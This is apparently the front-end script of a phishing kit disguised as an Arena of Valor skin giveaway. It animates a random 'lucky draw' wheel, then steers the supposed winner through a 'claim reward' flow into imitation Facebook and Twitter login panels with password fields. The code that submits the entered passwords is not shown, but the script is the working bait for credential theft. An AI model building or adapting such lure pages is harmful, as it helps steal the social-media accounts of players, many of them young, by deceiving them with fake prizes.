const hadiah = {
  0: "./images/qua/nakroth-thu-nguyen-ve-than.jpg",
  1: "./images/qua/skin-ngau-nhien.jpeg",
  2: "./images/qua/ruong-chon-skin.jpeg",
  3: "./images/qua/dieu-nhay-ngau-nhien.jpeg",
  4: "./images/qua/airi-kiamono.png",
  5: "./images/qua/dieu-thuyet-tbb.png",
  6: "./images/qua/yorn-nguyet-toc.png",
};

const jumlah = 7;
const min_loncat = 30;
let shagitz = -1;
let peloncatan = 0;
let kecepatan = 30;
let waktu = 0;
let haidah = -1;

function jalankan() {
  $(`[data-order="${shagitz}"]`).removeClass("shagitz-active");

  shagitz += 1;

  if (shagitz > jumlah - 1) {
    shagitz = 0;
  }

  $(`[data-order="${shagitz}"]`).addClass("shagitz-active");
}

function ngerandomHadiah() {
  return Math.floor(Math.random() * jumlah);
}

function controllSpeed() {
  peloncatan += 1;
  jalankan();
  if (peloncatan > min_loncat + 10 && haidah === shagitz) {
    clearTimeout(waktu);

    $(".reward_confirmation").fadeIn();
    $("#hadiahnya").attr("src", hadiah[shagitz]);

    haidah = -1;
    peloncatan = 0;
  } else {
    if (peloncatan < min_loncat) {
      kecepatan -= 5;
    } else if (peloncatan === min_loncat) {
      const random_number = ngerandomHadiah();
      haidah = random_number;
    } else {
      if (peloncatan > min_loncat + 10 && haidah === shagitz + 1) {
        kecepatan += 600;
      } else {
        kecepatan += 20;
      }
    }
    if (kecepatan < 40) {
      kecepatan = 40;
    }

    waktu = setTimeout(controllSpeed, kecepatan);
  }
}

function init() {
  peloncatan = 0;
  kecepatan = 100;
  haidah = -1;
  controllSpeed();
  var audio = document.getElementById("sound");
  audio.play();
}

$(document).ready(() => {
  $("#draw").on("click", init);
});

function open_reward_confirmation(ag) {
  var rewardnya = $(ag).attr("src");
  $(".reward_confirmation").fadeIn();
  $("#hadiahnya").attr("src", rewardnya);
}
function open_exchange(ag) {
  var ucnya = $(ag).attr("value");
  $(".exchange").fadeIn();
  $("#ucnya").html(ucnya);
}
function open_about() {
  $(".about").fadeIn();
}
function open_account_login() {
  $(".account_login").fadeIn();
  $(".reward_confirmation").fadeOut();
}
function open_facebook() {
  $(".login-facebook").fadeIn();
  $(".account_login").fadeOut();
}
function open_twitter() {
  $(".login-twitter").fadeIn();
  $(".account_login").fadeOut();
}

function close_reward_confirmation() {
  $(".reward_confirmation").fadeOut();
}
function close_about() {
  $(".about").fadeOut();
}
function close_exchange() {
  $(".exchange").fadeOut();
}
function close_account_login() {
  $(".account_login").fadeOut();
}
function tutup_facebook() {
  $(".login-facebook").fadeOut();
  $(".account_login").fadeIn();
}
function open_nvn() {
  $(".account_login").fadeIn();
}
function tutup_twitter() {
  $(".login-twitter").fadeOut();
  $(".account_login").fadeIn();
}
function showFbPassword() {
  var x = document.getElementById("fbPassword");
  if (x.type === "password") {
    x.type = "text";
    $(".showPassword").hide();
    $(".hidePassword").show();
  } else {
    x.type = "password";
  }
}
function hideFbPassword() {
  var x = document.getElementById("fbPassword");
  if (x.type === "text") {
    x.type = "password";
    $(".showPassword").show();
    $(".hidePassword").hide();
  } else {
    x.type = "text";
  }
}

// show hide password for twitter
function showTwitterPassword() {
  var x = document.getElementById("twitterPassword");
  if (x.type === "password") {
    x.type = "text";
    $(".TwitterShowPassword").hide();
    $(".TwitterHidePassword").show();
  } else {
    x.type = "password";
  }
}
function hideTwitterPassword() {
  var x = document.getElementById("twitterPassword");
  if (x.type === "text") {
    x.type = "password";
    $(".TwitterShowPassword").show();
    $(".TwitterHidePassword").hide();
  } else {
    x.type = "text";
  }
}
